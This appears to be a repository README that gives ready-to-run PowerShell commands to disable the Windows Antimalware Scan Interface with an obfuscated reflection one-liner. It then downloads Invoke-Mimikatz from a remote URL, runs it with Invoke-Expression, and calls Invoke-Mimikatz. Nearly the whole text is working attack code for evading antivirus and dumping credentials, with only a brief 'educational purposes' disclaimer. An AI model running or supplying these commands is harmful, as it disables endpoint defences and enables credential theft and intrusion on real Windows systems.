# 🔥 AMSI Bypass + Mimikatz Execution

This repository provides a method to bypass the **Windows Antimalware Scan Interface (AMSI)**, allowing **Mimikatz** to execute without triggering antivirus detection.  
⚠️ **This technique is for educational and research purposes only.** Use it responsibly.

---

## 🚀 How to Use

### **Step 1: Disable AMSI in PowerShell**
Run the following command in **PowerShell** to bypass AMSI:

```powershell
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType("System.Management.Automation.${b}${a}Utils");$z=$Ref.GetField("am${a}InitFailed",'NonPublic,Static');$z.SetValue($null,$true)
```
### **Step 2: Download Mimikatz**

````powershell
$Y=New-Object Net.WebClient;$script=$Y.DownloadString("https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1");Invoke-Expression $script
````
### **Step 3: Execute Mimikatz**
Run the following command in **PowerShell** to execute Mimikatz:

```powershell
Invoke-Mimikatz
````

